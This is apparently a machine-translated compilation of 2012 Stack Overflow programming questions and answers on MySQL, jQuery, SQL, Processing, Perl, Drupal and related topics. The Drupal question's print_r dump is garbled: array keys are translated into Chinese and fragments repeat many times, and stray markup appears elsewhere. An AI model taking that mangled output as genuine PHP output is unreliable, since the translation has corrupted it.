# mysql - ExpressionEngine：git：本地开发：远程数据库

> ID：13271932
> 
> 赞同：11
> 
> 时间：2012-11-07T14:39:17.533
> 
> 标签：mysql, git, expressionengine

对于那些试图成为优秀的小开发人员并使用 git 对他们的 ExpressionEngine 站点进行版本控制的人来说，你如何处理你的数据库？

在我与多个开发人员在一个 ExpressionEngine 站点上工作的有限经验中，我们不得不全部运行在远程 Web 服务器上运行的单个 MySQL 开发数据库。对于那些尝试过的人来说，它非常缓慢。页面加载很容易花费 5-10 秒，使开发变得极其困难。在远程开发服务器上工作会更快。我试图避免在远程 MySQL 服务器上工作，以便能够在任何地方工作，而不依赖于 Internet 连接速度/质量。

只是想知道其他人如何处理他们的 MySQL 数据库。

您的所有开发人员都使用一个中央数据库吗？您是否像我们一样处理过缓慢的问题？

您是否将数据库置于版本控制之下？您如何处理多个开发人员和多个分支之间的导出/导入？

使用一个开发人员，我可以非常轻松地导入/导出/提交数据库，但是一旦您将另一个开发人员添加到组合中，它就会变得非常混乱。期待听到大家对这个庞大话题的看法。

谢谢！

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-11-07T14:50:21.727

使用远程数据库失败的 DNS 请求似乎浪费了很多时间。

使用`start mysqld with --skip-name-resolve`. （关于这个主题的更多信息可以在这里找到：http: [//dev.mysql.com/doc/refman/5.0/en/host-cache.html](http://dev.mysql.com/doc/refman/5.0/en/host-cache.html)）

拥有一个远程数据库似乎仍然是我们与多个开发人员一起处理项目的最佳方式。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-11-07T14:52:43.250

我几乎总是使用中央数据库进行开发。根据您使用的主机，速度差异可能不会很大。

显然，如果您没有对数据库进行更改，即仅进行模板开发，则不需要保持数据库同步，因此您可能会调出数据库的本地副本。你只需要记住重复任何数据库更改，如果你最终做了一些。

至于版本控制，我在我的基础存储库中保留了一份我的基础 EE 安装的 SQL 文件。除此之外，我通常不会在 Git 中保留数据库的副本，所以我不会做很多导入/导出等操作。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-11-07T14:53:05.933

在我的公司（4 名开发人员）中，我们每个人都在本地运行自己的数据库。但最近我测试了 Rackspace 云数据库（但还有其他云数据库供应商），以获取可能难以在小型笔记本电脑上运行的重型数据库。它比运行我们自己的数据库服务器相对便宜，并且可以在几分钟内设置或删除。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-11-07T17:59:55.713

你最近看过 EE Profiler 吗？您可能会注意到主页上大约有 20-80 个查询，具体取决于它的复杂性。

问题在于，对于每个查询，MySQL 必须执行一个远程数据请求，下载响应，然后向 ExpressionEngine 提供它的数据。数据库的 20-80 次往返是导致您延迟的原因，我认为您对此无能为力。使用远程（我们的网络之外）数据库时，我会遇到与您相同的延迟。

当 MySQL 在您的机器或生产服务器上运行时，它没有添加的网络请求导致它的数据请求延迟。这就是区别。

至于修复，您所能做的就是移动到托管在内部网络上的数据库。我们有一台模仿我们用于登台的生产环境的 Linux 机器。由于它在我们的网络上，我们可以在`database.php`文件中使用本地 IP 地址。这*要*快得多。

The problem that we still have is the issue of channels/fields/entries. When a developer is working on a new section, they'll likely need to create a new channel and fields and/or new entries. When we're ready to push that functionality to production, we have to manually make those changes on the production server as there is no way to reliably export them. I am hopeful of [this addon](https://github.com/ckimrie/Site-Manager) though---we'll see.

# javascript - 如何在javascript中动态检查和增加div id？

> ID：13271934
> 
> 赞同：0
> 
> 时间：2012-11-07T14:39:25.927
> 
> 标签：javascript, jquery, html, onclick, jwplayer

我有一张使用 Longtail Video 的 JW 播放器的视频表。当您单击表格中的图像时，视频会以 id 的模式启动`media modal`。这是我正在谈论的页面：http: [//www.calvaryccm.com/volunteer/featured-ministry](http://www.calvaryccm.com/volunteer/featured-ministry)。

这是模态的Javascript：

```
$(".mediamodal").unbind('click');
$(".mediamodal").click(function () {
    $('.reveal-modal-bg').unbind('click');
    $('.close-reveal-modal').unbind('click');
    $('#mediamodal').remove();
    $('body').append('<div id="mediamodal" class="reveal-modal large" style="width:675px; margin-left:-415px;"><div id="mediaplayer"><script type="text/javascript">SetupMediaPlayer("' + $(this).attr('rel').toLowerCase() + '");</script></div><div id="livepoll_min" style="padding-top:20px;"></div><a class="close-reveal-modal">&#215;</a></div>"');
    $('#mediamodal').reveal({
        animation: 'fadeAndPop',                   //fade, fadeAndPop, none
        animationspeed: 300,                       //how fast animtions are
        closeonbackgroundclick: true,              //if you click background will modal close?
        dismissmodalclass: 'close-reveal-modal'    //the class of a button or element that will close an open modal
    });
    $('.reveal-modal-bg').click(function () {
        $("#mediaplayer").remove();
        socket.disconnect();
    });

    $('.close-reveal-modal').click(function () {
        $("#mediaplayer").remove();
        socket.disconnect();
    }); 
```

这适用于桌面浏览器，但不适用于 iPad。我在 Longtail 的页面上查找了为什么这会失败，他们说每个都需要一个唯一的 div id。我意识到这是一个问题，因为我正在生成 div onclick。

如何动态更改每个视频的 div id？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-07T14:46:37.170

你可以只使用一个全局计数器：

```
var hiImACounter = 0;

$(".mediamodal").unbind('click');
$(".mediamodal").click(function () {
    $('.reveal-modal-bg').unbind('click');
    $('.close-reveal-modal').unbind('click');
    $('#mediamodal' + hiImACounter++).remove(); // <--- increment after the operation
    $('body').append('<div id="mediamodal'+hiImACounter+'" class="reveal-modal large" style="width:675px; margin-left:-415px;"><div id="mediaplayer'+hiImACounter+'"><script type="text/javascript">SetupMediaPlayer("' + $(this).attr('rel').toLowerCase() + '");</script></div><div id="livepoll_min" style="padding-top:20px;"></div><a class="close-reveal-modal">&#215;</a></div>"');
    $('#mediamodal'+hiImACounter).reveal({
        animation: 'fadeAndPop',                   //fade, fadeAndPop, none
        animationspeed: 300,                       //how fast animtions are
        closeonbackgroundclick: true,              //if you click background will modal close?
        dismissmodalclass: 'close-reveal-modal'    //the class of a button or element that will close an open modal
    });
    $('.reveal-modal-bg').click(function () {
        $("#mediaplayer"+hiImACounter).remove();
        socket.disconnect();
    });

    $('.close-reveal-modal').click(function () {
        $("#mediaplayer"+hiImACounter).remove();
        socket.disconnect();
    }); 
```

# jquery - Jquery cookie不执行条件语句

> ID：13271936
> 
> 赞同：0
> 
> 时间：2012-11-07T14:39:30.280
> 
> 标签：jquery

我已经将cookie设置为。

这是在点击事件上执行的。

```
 $("#scan").click(function(){
     $.cookie('scanner', true);
  }); 
```

现在，当它设置好时，我会做这样的事情。

```
 $(document).ready(function(){

        var test = $.cookie('scanner');
        alert(test);
        if(test == true){

        setTimeout(function(){

            $("#scan").click();

        },10);
        }

}); 
```

现在，当我在新选项卡中打开我的页面时，会弹出警报说这是真的，但没有执行点击功能。这是为什么？

谢谢，

**编辑：当我关闭标签而不是浏览器时，如何删除 cookie？**

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-07T14:41:17.647

您的 cookie 值被保存并作为字符串读取。

尝试

```
 if (test == "true") { 
```

# asp.net - VB.NET (SQL) 查询中的 If/Else 语句？

> ID：13271951
> 
> 赞同：0
> 
> 时间：2012-11-07T14:40:09.997
> 
> 标签：asp.net, sql, vb.net

我只是想知道`If/Else`在 VB.Net 代码中的 SQL 查询中添加语句的最佳方法是什么？

这是我当前的查询（不起作用）：

```
SELECT 
   FIRSTNAME, LASTNAME 
FROM 
   TBL_USERS 
ORDER BY 
   If(SortSelect() Is ""lastname"", LASTNAME, FIRSTNAME) 
```

提前致谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-07T14:43:19.547

你可以尝试这样的事情：

```
SELECT FIRSTNAME, LASTNAME 
FROM TBL_USERS 
ORDER BY Case when <SortSelect>= 'lastname' then LASTNAME else  FIRSTNAME end 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-07T14:47:26.123

我对此的看法是永远不要把它`IF`放在 SQL 语句中。它使阅读变得太难了。可能是因为它们都在同一条线上。

在您的情况下，只有一个，但是当您有很多条件时，几乎无法阅读。

您应该像这样为您的条件声明一个字符串

```
Dim strQuery as string
Dim strOrderBy as string

If(SortSelect() = "lastname") then
   strOrderBy = "Order By lastname"
Else
   strOrderBy = "Order By firstname"
endif

strQuery = "SELECT FIRSTNAME, LASTNAME FROM TBL_USERS " & strOrderBy 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-07T14:43:21.837

```
Dim sql as string = "SELECT FIRSTNAME, LASTNAME FROM TBL_USERS ORDER BY "
if (SortSelect() = "lastname")
    sql = sql & "lastname"
else
    sql = sql & "firstname"
end if 
```

# jquery - 如何在带有请求参数的页面上使用 jQuery UI 选项卡

> ID：13271953
> 
> 赞同：0
> 
> 时间：2012-11-07T14:40:34.340
> 
> 标签：jquery

我有一个页面，当没有参数时显示一个表格。但是如果传递了一个参数，它会显示一个用于编辑的表单。我在这里尝试使用 jquery 选项卡，但它会将整个页面与表格一起加载到选项卡内容应该位于的位置。

html:

```
<div id="tabs">
    <ul>
        <li><a href="#tabs-1">Edit Product</a></li>
        <li><a href="#tabs-2">Images</a></li>
    </ul>
    <div id="tabs-1">
        <strong>Form goes here</strong>
    </div>
    <div id="tabs-2">
        <strong>Edit images here</strong>
    </div>
</div> 
```

**运行前截图`$('#tabs').tabs()`：** ![在运行 tabs() 之前](../Images/3696d4d347f17b1938dda07d8938d055.png)

**之后的截图：** ![运行选项卡后](../Images/ec08fae6fbe3e461e04d007b657e4ba0.png)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-07T14:46:10.383

对我来说，这听起来更像是一个后端问题。服务器应该只给你一个部分文件而不是整个站点，以减少带宽使用。这不是真正的 jquery 问题，而是您如何处理请求服务器端的问题。

给它一些参数，如 partial=true 或检查它是否通过 AJAX 请求调用，然后只传递部分文件。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-15T19:22:21.400

问题出在 Joomla 包含的 MooTools 中。虽然我没有使用任何 mootools 函数，但它以某种方式被 jQuery 的“加载”事件触发。我决定不使用标签，因为我找不到解决方案。但是当我对图像使用模态弹出窗口时，我遇到了同样的问题。（通过开发人员工具上的网络选项卡进行调试，发现 MooTools 是罪魁祸首。）只需将其删除即可解决问题。

# java - EditText中提示后如何将焦点设置为文本？

> ID：13271957
> 
> 赞同：0
> 
> 时间：2012-11-07T14:40:51.857
> 
> 标签：java, android, input, focus, android-edittext

我有兴趣你可以在提示到EditText之后将焦点设置为文本吗？如果xml布局没有这样的属性？此刻我还是这个样子。

![在此处输入图像描述](../Images/2429ec74f955ab7d7a8ff13135d1948c.png)

需要

![在此处输入图像描述](../Images/0e14b51c4f98a6836b6fc702ff68e27e.png)

**编辑：给*****Asok***
**的最快和有效的答案 我也找到了类似的方法：*EditText.append("60");* *// 60 或者你在 EditText 中的文本***

 *** * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-07T15:07:01.037

提示不是真正的文本，它会在用户输入内容后消失。假设光标位于提示的末尾，当用户按下按钮并且提示消失时，您期望什么行为？

您可以做的是通过在 XML 中设置默认文本

```
android:text="60" 
```

或通过代码

```
editText.setText("60"); 
```

并通过焦点跳转到 EditText 的末尾

```
editText.setSelection(editText.getText().length()); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-07T15:00:12.173

如果我理解正确，您希望将光标放在提示文本后面，如果这是正确的，那么这是不可能的，您必须删除提示并`setText`改用，如下所示：

```
EditText et = (EditText)findViewById(R.id.sixtyseconds);
et.setText("60");
et.setSelection(et.getText().length()); 
```**

# php - 比较项目的顺序

> ID：13271960
> 
> 赞同：-1
> 
> 时间：2012-11-07T14:41:01.797
> 
> 标签：php, function, if-statement

我正在阅读 PHP 的 Array 人，我看到了这个：

```
<?php
// fill an array with all items from a directory
$handle = opendir('.');
while (false !== ($file = readdir($handle))) {
    $files[] = $file;
}
closedir($handle); 
?> 
```

在 readdir 手册页中，它说“正确的循环方式”。

我想知道`X !== false`和之间是否有区别`false !== X`。谢谢！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-07T14:42:44.383

不，没有区别。您有时会看到`false == x`而不是的原因`x == false`是它有助于防止意外键入`x = false`，这在 if 或循环结构中是允许的，但可能不是您想要的。 `false = x`是荒谬的，并且会产生错误而不是默默地分配一些东西。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-07T14:43:11.537

不，是一样的

写这个

```
false !== X 
```

也称为“尤达条件”:) 当您想避免意外分配时非常有用（使用 = 而不是 ==）

# java - 处理语言中的自定义函数

> ID：13271961
> 
> 赞同：0
> 
> 时间：2012-11-07T14:41:02.123
> 
> 标签：java, processing

在“处理”编程语言（Java 的一种形式）上做一些 uni 工作。

所以我的问题是**'编写一个名为 twoNumbers(int a,int b) 的函数，它接受两个参数 a 和 b。如果 a 大于 b，则将这两个数字相加，并在控制台窗口中显示字符串“a 和 b 的总和是总和”，其中 a 和 b 以及总和是 a、b 和它们的值和。最后，函数应该返回总和。**

..soo 这是我对代码的尝试，如果我将 (int a,int b) 放在客户函数之后，它只是说我的另一个 int a = number，是重复的，这是真的，但我不确定如何我要给出一个和 ba 号码而不认为它是重复的？我应该把它从一个无效的设置标签中拿出来吗？因为我不确定这是否会导致太多的 { 括号...

```
/* Question 1 */

int twoNumbers(){
int a = 30;
int b = 20;
 if (a > b) {println(a+b);}
  println("The sum of a and b is sum");
  int sum;
  sum = a+b;
  println(sum);
} 
```

任何帮助都将对完成此问题和其他问题大有帮助:)

谢谢！！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-07T16:15:35.500

此外，您的函数没有返回值，这会给您一个错误。看起来你在混淆事情。要么将其声明为 void，要么返回声明类型的值（最后是您的分配所要求的）。无论哪种方式，都需要调用函数或方法来执行，而您没有调用它！所以你的函数里面的代码没有运行！！以下：

```
void imAMethod()
{
  println("hello");
} 
```

这是一个有效的方法，但什么都不做，你需要调用它，比如：

```
imAMethod();// calling your method

void imAMethod()
{
  println("hello");
} 
```

但这也不起作用，会给你错误**“看起来你正在混合“活动”和“静态”模式”**。那是因为要在处理中使用一个函数，你需要在草图中至少有一个 setup() 方法，所以：

```
 void setup()
{
  imAMethod();
}//end of setup

void imAMethod()
{
println("hello");
} 
```

将按预期工作。

但是您需要一个函数，因此正如 Jesper 指出的那样，您必须执行以下操作：

```
int a = 30; // those are global variables to pass to your function
int b = 20;
void setup()// this is a builtin basic Processing method
 {
   //call your function 
   println("The sum of " + a + " and " + b + " is "+ twoNumbers(a, b));
 }

int twoNumbers(int a, int b)
{ 
//do your math and tests here
return result;
} 
```

作业中还有一件事不清楚。一个函数**必须**返回一些东西，所以不清楚如果**a**不大于**b**函数应该返回什么。您将不得不处理这种情况，否则编译器会抱怨。您可能希望将此测试移出函数以使事情变得更容易，例如：

```
if (a < b)
println("The sum of " + a + " and " + b + " is "+ twoNumbers(a, b));//call your function
else
println(a + " is smaller than " + b); 
```

在函数中只做总和。但这可能不是作业所要求的......无论如何，即使**a**不大于**b** ，您也需要返回一些东西。请注意，打印到控制台也可以在函数内部完成。

Hummm, re reading the assignment a think what is expected is: Aways return the sum, and just print if **a** is greater than **b**, which makes more sense and is easier, something like:

```
int twoNUmbers(int a, int b)
{
 if (a < b){/*print the string*/}
 return a + b;
} 
```

Just a note for jlordo. In Processing.org you don't have a main, or better, it is transparent/hidden from user. Processing is like a "dialect" of java. So the code above would run as it is. There are two basic builtin functions: setup() and draw(). If the user do not use none of them the IDE will warps it in a setup() function, that will call the main() somewhere else. It will run once. Draw() instead loops forever.

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-07T14:46:46.617

> '编写一个名为 twoNumbers(int a,int b) 的函数，它接受两个参数 a 和 b。

这不是您的代码的样子。您的方法`twoNumbers`不采用两个参数`a`和`b`. 你的代码应该像这样开始（正如作业中提到的那样）：

```
int twoNumbers(int a, int b) { 
```

删除接下来的两行`int a = 30;`和`int b = 20;`。`a`这些行声明了两个名为和的局部变量`b`。您应该改用作为参数传入的`a`and 。`b`

这看起来也不对：

```
if (a > b) {println(a+b);}
println("The sum of a and b is sum"); 
```

仔细看看作业是怎么说的：

> 如果 a 大于 b，则将这两个数字相加，并在控制台窗口中显示字符串“a 和 b 的总和是总和”，其中 a 和 b 以及总和是 a、b 和它们的值和。

那不是您的代码正在做的事情。循序渐进，仔细思考作业中的含义。

# jquery-mobile - Jquery Mobile 表示例

> ID：13271963
> 
> 赞同：2
> 
> 时间：2012-11-07T14:41:12.083
> 
> 标签：jquery-mobile

我在 jquery 移动网站上看到了演示并找到了这个表格示例 - [http://jquerymobile.com/branches/tables/docs/tables/movie-list.html](http://jquerymobile.com/branches/tables/docs/tables/movie-list.html)。

但是当我尝试在移动设备上使用它时，表格不适合屏幕。回流表不起作用。

任何人都可以向我指出一个 Jquery Mobile 表的任何工作示例吗？

谢谢。

# matlab - 通过滑动窗口查看图片

> ID：13271968
> 
> 赞同：0
> 
> 时间：2012-11-07T14:41:18.643
> 
> 标签：matlab, image-processing

我有[这张图片（太大而无法包含）](http://i45.tinypic.com/339hd7t.jpg)（`2351x997`）并且我正在尝试检测水平线，首先我必须应用一个窗口作为

```
M=T(1:d,1:l); 
```

`T`是我的图像，`d`是宽度（4 像素），`l`是我感兴趣区域的长度（`l=0,2*2351`）。然后在这个窗口中，我必须计算黑色像素 ( `n`)、平均值 ( `m`) 和标准偏差 ( `σ`)。

之后如果我假设我检测到一条线`n/(lxd) >0.6`。`σ<1,2`

应用的窗口将在图像中滑动`l/4`

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-07T16:25:47.897

您可以尝试按照此示例进行操作，

[SCW 示例](http://lebgeeks.com/forums/viewtopic.php?id=7786)

# php - 如何将输入字符串分配为变量

> ID：13271969
> 
> 赞同：0
> 
> 时间：2012-11-07T14:41:18.390
> 
> 标签：php, string, variables, input

我不知道它在技术上叫什么，但在这里我试图实现用户可以从表单文本输入中插入一个定义词作为字符串，而不是用定义的变量替换它。

例子：

```
$username = myfunction(); 
```

现在我想允许用户`username`在输入字段中输入一个定义的单词，它将替换为 $username 变量。

所以我想将它用于like`Contact to '.$username.'`所以用户可以使用该字符串关键字输入和更改 $username 位置，他们可以像这样玩`$username .'info'`等等。

希望我解释得当，而不是用有趣的方式。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-07T14:59:01.300

您需要向用户提供模板变量列表，例如：

```
##USERNAME##
##ADDRESS##
etc. 
```

用户可以在表单中自由使用。然后你可以做一个简单的`str_replace`（该函数将数组作为参数）来一次替换所有模板变量。

您的代码将类似于：

```
$search = array('##USERNAME##', '##ADDRESS##', ...);
$replace = array($username, $address, ...);

$modified_text = str_replace($search, $replace, $original_text); 
```

# drupal - 打印与内容类型相关的所有“地图”

> ID：13271970
> 
> 赞同：0
> 
> 时间：2012-11-07T14:41:27.083
> 
> 标签：drupal, drupal-7

我的内容类型，计划拥有一个或多个“地图”。

使用以下 php 代码，我可以获取他们的所有链接：

```
 <?php  print render($content['field_mappe_di_riferimento']); ?> 
```

我得到以下结果：

![在此处输入图像描述](../Images/eabdc01eaec736e178bdbc46b8cb18b1.png)

我想在链接之前放置内容类型“Mappa”中的图像，在“field_immagine_min”字段中输入。

这是我的内容类型的结构：

![在此处输入图像描述](../Images/a9e6aa1ebf18f55b8e4649fb7618f1b2.png)

这是内容类型“Mappa”：

![在此处输入图像描述](../Images/d90377e1a5cd3e8debc93b8e2143e4fd.png)

与：“print_r（$field_mappe_di_riferimento）；” 我得到它：

Array ( [0] => Array ( [nid] => 30 [access] => 1 [node] => stdClass Object ( [vid] => 30 [uid] => 1 [title] => Carta di Marignano, primo giorno, 13 Settembre 1515 [log] => [status] => 1 [comment] => 1 [promote] => 1 [sticky] => 0 [nid] => 30 [type] => mappa [language] => en [创建] => 1352066743 [更改] => 1352127342 [tnid] => 0 [翻译] => 0 [revision_timestamp] => 1352127342 [revision_uid] => 1 [field_battaglia_di_riferimento] => 数组 ([und] = > 数组 ( [0] => 数组 ( [nid] => 2 ) ) ) [field_immagine_std] => 数组 ( [und] => 数组 ( [0] => 数组 ( [fid] => 23 [alt] = > [标题] => [宽度] => 672 [高度] => 554 [uid] => 1 [文件名] =>polesella.jpg [uri] => public://polesella_0.jpg [filemime] => 图片/jpeg [文件大小] =>337755 [状态] => 1 [时间戳] => 1352066743 [rdf_mapping] => 数组 ( ) ) ) ) [field_immagine_min] => 数组 ( [und] => 数组 ( [0] => 数组 ( [fid] => 24 [alt] => [title] => [width] => 150 [height] => 110 [uid] => 1 [filename] =>polesella_small.jpg [uri] => public://polesella_small.jpg [ filemime] => image/jpeg [filesize] => 10672 [status] => 1 [timestamp] => 1352066743 [rdf_mapping] => Array ( ) ) ) ) [field_testo_opzionale] => Array ( [und] => Array ( [0] => Array ([value] => pisello [format] => [safe_value] => pisello) ) [rdf_mapping] => Array ([rdftype] => Array ([0] => sioc:Item24 [alt] => [title] => [width] => 150 [height] => 110 [uid] => 1 [filename] =>polesella_small.jpg [uri] => public://polesella_small.jpg [ filemime] => image/jpeg [filesize] => 10672 [status] => 1 [timestamp] => 1352066743 [rdf_mapping] => Array ( ) ) ) ) [field_testo_opzionale] => Array ( [und] => Array ( [0] => Array ([value] => pisello [format] => [safe_value] => pisello) ) [rdf_mapping] => Array ([rdftype] => Array ([0] => sioc:Item24 [alt] => [title] => [width] => 150 [height] => 110 [uid] => 1 [filename] =>polesella_small.jpg [uri] => public://polesella_small.jpg [ filemime] => image/jpeg [filesize] => 10672 [status] => 1 [timestamp] => 1352066743 [rdf_mapping] => Array ( ) ) ) ) [field_testo_opzionale] => Array ( [und] => Array ( [0] => Array ([value] => pisello [format] => [safe_value] => pisello) ) [rdf_mapping] => Array ([rdftype] => Array ([0] => sioc:ItemArray ( [value] => pisello [format] => [safe_value] => pisello ) ) ) [rdf_mapping] => Array ( [rdftype] => Array ( [0] => sioc:ItemArray ( [value] => pisello [format] => [safe_value] => pisello ) ) ) [rdf_mapping] => Array ( [rdftype] => Array ( [0] => sioc:Item[1](https://i.stack.imgur.com/a9c8Y.png) => foaf:Document ) [title] => Array ( [predicates] => Array ( [0] => dc:title ) ) [created] => Array ( [predicates] => Array ( [0] =>直流：日期[1](https://i.stack.imgur.com/a9c8Y.png)1 [comment_count] => 0 [name] => ant [picture] => 0 [data] => b:0; ) ) )

所以我尝试获取要拍照的节点的nid，成功：

```
 print ($content['field_mappe_di_riferimento']['#items'][0][nid]); 
```

我得到30...

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-08T10:36:47.930

我找到了解决方案：

```
$array = $content['field_mappe_di_riferimento']['#items'];

$k = 0;

foreach($array as $k => $v){

  print($k);

  //carico il nodo
  $node = node_view(node_load($content['field_mappe_di_riferimento']['#items'][$k]['nid']));

   //stampa l'img del nodo
   print render($node['field_immagine_min']);

  } 
```

# perl - 如何在 Perl 中格式化输出？

> ID：13271974
> 
> 赞同：2
> 
> 时间：2012-11-07T14:41:34.157
> 
> 标签：perl, text, formatting

我有一个负责格式化输出的 Perl 代码。问题是我需要计算要在每个字符串中的一个特定字符之前放置的正确标签数（假设它是 /）。因此，我不想得到不同长度的行，而是得到固定长度的字符串（但尽可能短，使用最长的作为最大值）。我应该如何处理这个？

输出示例（格式被注释掉，只是原始数组）：

> ```
> Long title with some looong words / short text
> Another title / another short text 
> ```

我需要这样的：

```
title with some looong words / short text
Different title              / another short text 
```

这是我的第一次尝试，但它不涉及在一个特定字符后使用制表符。

```
my $text = Text::Format->new;

$text->rightAlign(1);
$text->columns(65);
$text->tabstop(4);

$values[$i] = $text->format(@values[$i]); 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-07T18:44:59.717

在 Perl 中有两种普遍接受的格式化文本的方法，因此列排列：

*   使用`printf`和`sprintf`。这可能是最常见的方式。
*   使用[Perl 格式](http://perldoc.perl.org/perlform.html)功能。您定义您想要的线条看起来像什么，然后使用[write](http://perldoc.perl.org/functions/write.html)打印到该格式。

多年来，我还没有看到人们使用 Perl 格式规范的东西。**这是Perl** **3.x****鼎盛**时期的一个重要功能，因为 Perl 主要用作超级 awk 替代语言（**实用**提取和报告语言）。但是，机制仍然存在，我相信它会很有趣。

 ******* * *

现在是查询的第二部分。你真的不只是希望文本被格式化，你希望它被***格式化为 tabs***。

[幸运的是，Perl 有一个名为Text::Tabs](http://perldoc.perl.org/5.8.8/Text/Tabs.html)的内置模块。它是那些完成一两个晦涩任务的模块之一，但做得很好。

实际上，`Text::Tabs`它不能很好地处理这两项任务，但足够了。

`sprintf`使用或内置 Perl 格式化功能生成您的报告。将整个报告保存在一个数组中。它必须是一个数组，因为`Text::Tabs`它不处理 NL。然后使用该`unexpand`函数将该数组中的空格替换为另一个带有制表符的数组。

**WORD 'O WARNING**：`Text::Tabs`做了一些非常顽皮的事情：它在`$tabstop`未经您许可的情况下将变量导入您的程序。如果您使用名为 的变量`$tabstop`，则必须更改它。您可以设置`$tabstop`为制表符代表的空格数。默认设置为 8。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-07T15:17:53.567

模块[Text::Table](http://p3rl.org/Text%3a%3aTable)可能会对您有所帮助。

```
#!/usr/bin/perl
use warnings;
use strict;

use Text::Table;

my @array = ('Long title with some looong words', 'short text',
             'Another title',                     'another short text');

my $table = Text::Table::->new(q(), \' / ', q()); # Define the separator.
$table->add(shift @array, shift @array) while @array;
print $table; 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-07T15:28:18.383

根据我在文档 Text::Format 中可以找到的内容，仅进行段落格式设置。你想要的是表格格式。基本方法是将数据拆分为每行和每列的文本矩阵，找到每列的最长元素，并使用它来输出固定宽度的数据。例如：

```
my @values = (
    'Long title with some looong words / short text',
    'Another title / another short text',
);

# split values into per-column text
my @text = map { [ split '\s*(/)\s*', $_ ] } @values;

# find the maximum width of each column
my @width;
foreach my $line (@text) {
    for my $i (0 .. $#$line) {
        no warnings 'uninitialized';
        my $l = length $line->[$i];
        $width[$i] = $l if $l > $width[$i];
    }
}

# build a format string using column widths
my $format = join ' ', map { "%-${_}s" } @width;
$format .= "\n";

# print output in columns
printf $format, @$_ foreach @text; 
```

这会产生以下结果：

```
Long title with some looong words / short text        
Another title                     / another short text 
```******

# audio - 如何将声卡的立体声输出配置为两个单独的输出并从不同的音频输入向每个输出发送音频？

> ID：13271980
> 
> 赞同：0
> 
> 时间：2012-11-07T14:41:46.453
> 
> 标签：audio, naudio, channel

我正在尝试将音频数据分别发送到声卡输出端口的左右输出通道。左右声道应该从两个不同的音频源获取数据。NAudio 可以吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-09T03:21:46.067

是的，请阅读我关于[在 NAudio 中处理多声道音频的文章](http://mark-dot-net.blogspot.co.uk/2012/01/handling-multi-channel-audio-in-naudio.html)。使您能够将`MultiplexingSampleProvider`不同的输入路由到不同的声卡输出。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-07T23:26:08.720

WaveChannel32 有 pan 作为参数。指定 1 或 -1。

# c# - 调用 Web 服务时如何捕获传入和传出的 xml

> ID：13271981
> 
> 赞同：1
> 
> 时间：2012-11-07T14:41:49.170
> 
> 标签：c#, web-services

我正在从 Windows 应用程序调用第三方 Web 服务。我只是在调用它时尝试捕获该 Web 服务生成的 xml 响应和请求，但失败了。在搜索谷歌时，我发现了很多文章，按照他们的说明和代码，但没有任何效果。

作为我发现的示例，我遵循了[这些说明](http://knowledgecenter.zuora.com/kb/How_do_I_capture_the_SOAP_API_Request_and_Response%3F)和[这些](http://msdn.microsoft.com/en-us/library/ms179346.aspx).

当我调用并使用返回和接受 XML 的 Web 服务时，谁能告诉我任何简单的方法来捕获传入和传出的 xml？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-07T14:44:22.403

使用[Fiddler](http://www.fiddler2.com/fiddler2/)或[Wireshark](http://www.wireshark.org/)，您可以在客户端捕获 http 流量。

我通常使用 Fiddler，它在客户端注册为代理，因此如果应用程序使用*Internet 选项*中定义的代理设置，则所有流量都会在启动 Fiddler 后自动显示。

# jsf - 第一次打开页面时只运行一次 JS 函数的自然方式，而不考虑刷新

> ID：13271995
> 
> 赞同：0
> 
> 时间：2012-11-07T14:43:01.370
> 
> 标签：jsf

是否有任何自然的方法可以使 JavaScript 函数在 JSF 页面上只运行一次？

我有一个带有 ViewScoped 支持 bean 的 JSF 页面。我想在页面第一次加载时运行一个 JS 函数，如果用户刷新页面就不要这样做。是否可以在不将变量添加到用户会话等的情况下这样做？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-07T22:12:20.737

在页面加载时设置 html cookie 并检查是否在下次刷新时设置，如果未设置则运行 js。

# ios - 是否有使用情节提要实现 facebook 登录到 ios 应用程序的好教程？

> ID：13271997
> 
> 赞同：2
> 
> 时间：2012-11-07T14:43:18.547
> 
> 标签：ios, facebook, cocoa, facebook-apps

嘿伙计们，我正在尝试使用情节提要在 ios 应用程序中实现 facbook 登录。用于身份验证的官方 facebook 教程仅使用 xib 文件。有一个使用故事板的示例应用程序，但理解imao 很复杂。 [这边-->](https://github.com/fbsamples/ios-social-cafe)

是否有使用情节提要实现 facebook 登录的完整分步指南？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-07T14:48:11.173

不知道故事板。但这是来自 raywenderlich.com 的教程[http://www.raywenderlich.com/1488/how-to-use-facebooks-new-graph-api-from-your-iphone-app](http://www.raywenderlich.com/1488/how-to-use-facebooks-new-graph-api-from-your-iphone-app)

这里还有更多教程： [http ://www.raywenderlich.com/tutorials](http://www.raywenderlich.com/tutorials)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-07T14:55:09.813

